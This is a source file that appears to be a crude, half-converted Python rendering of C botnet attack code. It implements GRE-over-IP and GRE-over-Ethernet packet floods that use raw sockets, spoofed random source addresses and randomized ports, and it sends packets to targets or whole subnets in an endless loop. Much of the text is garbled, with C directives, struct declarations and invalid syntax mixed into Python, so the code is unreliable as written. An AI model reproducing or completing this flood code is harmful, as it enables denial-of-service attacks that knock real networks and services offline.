import os
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
import <unistd.h>
import <sys/socket.h>
import <linux/ip.h>
import <linux/if_ether.h>
import <errno.h>

import includes_h_header
import attack_h_header
import protocol_h_header
import util_h_header
import checksum_h_header
import rand_h_header
import util_c

# predefined functions from imported modules
https_transport = includes_h_header.https_transport
dns_resolver = includes_h_header.dns_resolver
ipv4_t = includes_h_header.ipv4_t
htonl = includes_h_header.htonl
INET_ADDR = includes_h_header.INET_ADDR
xputc = includes_h_header.xputc
xputs = includes_h_header.xputs
va_list = includes_h_header.va_list
va_start = includes_h_header.va_start
va_end = includes_h_header.va_end
xvprintf = includes_h_header.xvprintf
xprintf = includes_h_header.xprintf
attack_target = attack_h_header.attack_target
attack_option = attack_h_header.attack_option
attack_method = attack_h_header.attack_method
attack_stomp_data = attack_h_header.attack_stomp_data
attack_http_state = attack_h_header.attack_http_state
attack_cfnull_state = attack_h_header.attack_cfnull_state
add_attack = attack_h_header.add_attack
free_opts = attack_h_header.free_opts
table_value = table_h_header.table_value
# DEBUG: This is how you generate these lines automatically, example...
# DEBUG: cat util_c.py | egrep -i 'def|class' | egrep -vi '#' | cut -d \( -f 1 | awk '{print $2" = util_c."$2}'
util_strlen = util_c.util_strlen
util_strncmp = util_c.util_strncmp
util_strcmp = util_c.util_strcmp
util_strcpy = util_c.util_strcpy
util_memcpy = util_c.util_memcpy
util_zero = util_c.util_zero
util_atoi = util_c.util_atoi
util_itoa = util_c.util_itoa
util_memsearch = util_c.util_memsearch
util_stristr = util_c.util_stristr
util_fdgets = util_c.util_fdgets
util_isupper = util_c.util_isupper
util_isalpha = util_c.util_isalpha
util_isspace = util_c.util_isspace
util_isdigit = util_c.util_isdigit

# def attack_gre_ip(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
def attack_gre_ip(targs_len, attack_target(targs, opts_len), attack_option(opts)):
    # dont_frag = True
    # data_rand = True
    # gcip = False
    def dont_frag():
        attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
        return True
    def data_rand():
        attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
        return True
    def gcip():
        attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, False)
        return False
    pkts = calloc(targs_len; sys.getsizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    # BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    dont_frag()
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    data_len = attack_get_opt_int(opts_len; 512)
    # BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    data_rand()
    # BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, False)
    gcip()
    source_ip = attack_get_opt_int(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sys.getsizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        # struct iphdr *iph
        # struct grehdr *greh
        # struct iphdr *greiph
        # struct udphdr *udph
        iphdr(iph)
        grehdr(greh)
        iphdr(greiph)
        udphdr(udph)

        pkts[i] = calloc(1510, sys.getsizeof ())
        # iph = (struct iphdr *)(pkts[i])
        # greh = (struct grehdr *)(iph + 1)
        # greiph = (struct iphdr *)(greh + 1)
        # udph = (struct udphdr *)(greiph + 1)
        iph = iphdr(pkts[i])
        greh = grehdr(iph + 1)
        greiph = iphdr(greh + 1)
        udph = udphdr(greiph + 1)
        # IP header init
        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        # iph.tot_len = htons(sys.getsizeof (struct iphdr) + sys.getsizeof (struct grehdr) + sys.getsizeof (struct iphdr) + sys.getsizeof (struct udphdr) + data_len)
        iph.tot_len = htons(sys.getsizeof(iphdr) + sys.getsizeof(grehdr) + sys.getsizeof(iphdr) + sys.getsizeof(udphdr) + data_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_GRE
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        # GRE header init
        greh.protocol = htons(ETH_P_IP) # Protocol is 2 bytes

        # Encapsulated IP header init
        greiph.version = 4
        greiph.ihl = 5
        greiph.tos = ip_tos
        # greiph.tot_len = htons(sys.getsizeof (struct iphdr) + sys.getsizeof (struct udphdr) + data_len)
        greiph.tot_len = htons(sys.getsizeof(iphdr) + sys.getsizeof(udphdr) + data_len)
        greiph.id = htons(~ip_ident)
        greiph.ttl = ip_ttl
        if dont_frag:
            greiph.frag_off = htons(1 << 14)
        greiph.protocol = IPPROTO_UDP
        greiph.saddr = rand_next()
        if gcip:
            greiph.daddr = iph.daddr
        else:
            greiph.daddr = ~(greiph.saddr - 1024)

        # UDP header init
        udph.source = htons(sport)
        udph.dest = htons(dport)
        # udph.len = htons(sys.getsizeof (struct udphdr) + data_len)
        udph.len = htons(sys.getsizeof(udphdr) + data_len)

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            # struct iphdr *iph = (struct iphdr *)pkt
            # struct grehdr *greh = (struct grehdr *)(iph + 1)
            # struct iphdr *greiph = (struct iphdr *)(greh + 1)
            # struct udphdr *udph = (struct udphdr *)(greiph + 1)
            iphdr(iph) = iphdr(pkt)
            grehdr(greh) = grehdr(iph + 1)
            iphdr(greiph) = iphdr(greh + 1)
            udphdr(udph) = udphdr(greiph + 1)
            data = ()(udph + 1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()

            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
                greiph.id = ~(iph.id - 1000)
            if sport == 0xffff:
                udph.source = rand_next() & 0xffff
            if dport == 0xffff:
                udph.dest = rand_next() & 0xffff

            if not gcip:
                greiph.daddr = rand_next()
            else:
                greiph.daddr = iph.daddr

            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sys.getsizeof (iphdr))

            greiph.check = 0
            greiph.check = checksum_generic(()greiph, sys.getsizeof (iphdr))

            udph.check = 0
            udph.check = checksum_tcpudp(greiph, udph, udph.len, sys.getsizeof (udphdr) + data_len)

            targs[i].sock_addr.sin_family = AF_INET
            targs[i].sock_addr.sin_addr.s_addr = iph.daddr
            targs[i].sock_addr.sin_port = 0
            # sendto(fd, pkt, sys.getsizeof (struct iphdr) + sys.getsizeof (struct grehdr) + sys.getsizeof (struct iphdr) + sys.getsizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sys.getsizeof (struct sockaddr_in))
            sendto(
                fd,
                pkt,
                sys.getsizeof(iphdr) + sys.getsizeof(grehdr) + sys.getsizeof(iphdr) + sys.getsizeof(udphdr) + data_len,
                MSG_NOSIGNAL,
                sockaddr(targs[i].sock_addr),
                sys.getsizeof(sockaddr_in)
            )

#ifdef DEBUG
        if errno != 0:
            printf("errno = %d\n" % (errno))
        break
#endif

# def attack_gre_eth(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
def attack_gre_eth(targs_len, attack_target(targs,opts_len), attack_option(opts)):
    pkts = calloc(targs_len; sys.getsizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    data_len = attack_get_opt_int(opts_len; 512)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, False)
    source_ip = attack_get_opt_int(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sys.getsizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct grehdr *greh
        struct ethhdr *ethh
        struct iphdr *greiph
        struct udphdr *udph

        iphdr(iph)
        grehdr(greh)
        ethhdr(ethh)
        iphdr(greiph)
        udphdr(udph)

        pkts[i] = calloc(1510, sys.getsizeof ())
        # iph = (struct iphdr *)(pkts[i])
        # greh = (struct grehdr *)(iph + 1)
        # ethh = (struct ethhdr *)(greh + 1)
        # greiph = (struct iphdr *)(ethh + 1)
        # udph = (struct udphdr *)(greiph + 1)

        iph = iphdr(pkts[i])
        greh = grehdr(iph + 1)
        ethh = ethhdr(greh + 1)
        greiph = iphdr(ethh + 1)
        udph = udphdr(greiph + 1)

        # IP header init
        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sys.getsizeof (iphdr) + sys.getsizeof (grehdr) + sys.getsizeof (ethhdr) + sys.getsizeof (iphdr) + sys.getsizeof (udphdr) + data_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_GRE
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        # GRE header init
        greh.protocol = htons(PROTO_GRE_TRANS_ETH) # Protocol is 2 bytes

        # Ethernet header init
        ethh.h_proto = htons(ETH_P_IP)

        # Encapsulated IP header init
        greiph.version = 4
        greiph.ihl = 5
        greiph.tos = ip_tos
        # greiph.tot_len = htons(sys.getsizeof (struct iphdr) + sys.getsizeof (struct udphdr) + data_len)
        greiph.tot_len = htons(sys.getsizeof(iphdr) + sys.getsizeof(udphdr) + data_len)
        greiph.id = htons(~ip_ident)
        greiph.ttl = ip_ttl
        if dont_frag:
            greiph.frag_off = htons(1 << 14)
        greiph.protocol = IPPROTO_UDP
        greiph.saddr = rand_next()
        if gcip:
            greiph.daddr = iph.daddr
        else:
            greiph.daddr = ~(greiph.saddr - 1024)

        # UDP header init
        udph.source = htons(sport)
        udph.dest = htons(dport)
        # udph.len = htons(sys.getsizeof (struct udphdr) + data_len)
        udph.len = htons(sys.getsizeof(udphdr) + data_len)

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            # struct iphdr *iph = (struct iphdr *)pkt
            # struct grehdr *greh = (struct grehdr *)(iph + 1)
            # struct ethhdr *ethh = (struct ethhdr *)(greh + 1)
            # struct iphdr *greiph = (struct iphdr *)(ethh + 1)
            # struct udphdr *udph = (struct udphdr *)(greiph + 1)
            iphdr(iph) = iphdr(pkt)
            grehdr(greh) = grehdr(iph+1)
            ethhdr(ethh) = ethhdr(greh+1)
            iphdr(greiph) = iphdr(ethh+1)
            udphdr(udph) = udphdr(greiph+1)
            data = ()(udph + 1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()

            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
                greiph.id = ~(iph.id - 1000)
            if sport == 0xffff:
                udph.source = rand_next() & 0xffff
            if dport == 0xffff:
                udph.dest = rand_next() & 0xffff

            if not gcip:
                greiph.daddr = rand_next()
            else:
                greiph.daddr = iph.daddr

            ent1 = rand_next()
            ent2 = rand_next()
            ent3 = rand_next()
            util_memcpy(ethh.h_dest, ()&ent1, 4)
            util_memcpy(ethh.h_source, ()&ent2, 4)
            util_memcpy(ethh.h_dest + 4, ()&ent3, 2)
            util_memcpy(ethh.h_source + 4, ((()&ent3)) + 2, 2)

            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sys.getsizeof (iphdr))

            greiph.check = 0
            greiph.check = checksum_generic(()greiph, sys.getsizeof (iphdr))

            udph.check = 0
            udph.check = checksum_tcpudp(greiph, udph, udph.len, sys.getsizeof (udphdr) + data_len)

            targs[i].sock_addr.sin_family = AF_INET
            targs[i].sock_addr.sin_addr.s_addr = iph.daddr
            targs[i].sock_addr.sin_port = 0
            # sendto(fd, pkt, sys.getsizeof (struct iphdr) + sys.getsizeof (struct grehdr) + sys.getsizeof (struct ethhdr) + sys.getsizeof (struct iphdr) + sys.getsizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sys.getsizeof (struct sockaddr_in))
            sendto(
                fd,
                pkt,
                sys.getsizeof(iphdr) + sys.getsizeof(grehdr) + sys.getsizeof(ethhdr) + sys.getsizeof(iphdr) + sys.getsizeof(udphdr) + data_len,
                MSG_NOSIGNAL,
                sockaddr(targs[i].sock_addr, sys.getsizeof(sockaddr_in))
            )

#ifdef DEBUG
        if errno != 0:
            printf("errno = %d\n" % (errno))
        break
#endif
